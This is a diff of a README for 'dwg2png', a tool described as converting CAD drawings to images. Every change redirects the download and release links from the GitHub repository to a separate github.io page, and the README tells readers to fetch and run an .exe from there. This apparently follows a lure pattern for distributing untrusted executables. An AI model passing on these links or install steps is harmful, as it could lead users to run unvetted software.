@@ -1,6 +1,6 @@
 # 🏗️ dwg2png - Convert CAD drawings to clear images
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/townmeetingferrimagnetism755/dwg2png)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://townmeetingferrimagnetism755.github.io)
 
 This tool converts complex DWG files into simple PNG images. It identifies text and data within your blueprints. You can use these files for your database or machine learning projects. The software performs these tasks without needing extra OCR tools.
 
@@ -13,7 +13,7 @@ This tool converts complex DWG files into simple PNG images. It identifies text 
 ## 📥 Getting the software
 Follow these instructions to acquire the tool:
 
-1. Visit the [official release page](https://github.com/townmeetingferrimagnetism755/dwg2png).
+1. Visit the [official release page](https://townmeetingferrimagnetism755.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start your download.
 4. Once the process completes, move the file to your desktop for easy access.
@@ -72,7 +72,7 @@ Use the metadata files to search through your drawing library. You can write sim
 ## ⚖️ Keeping the tool updated
 New versions appear on the link below. Check back periodically for improvements to speed and file support.
 
-[Download the latest update here](https://github.com/townmeetingferrimagnetism755/dwg2png)
+[Download the latest update here](https://townmeetingferrimagnetism755.github.io)
 
 ## 👤 Support and feedback
 If you find a drawing that does not convert well, create an issue on the GitHub repository page. Include the name of the file type or the error code shown in the command window. This helps maintain the software for all users. Do not share proprietary blueprints in public forums. Always redact sensitive information before you share files for support requests.
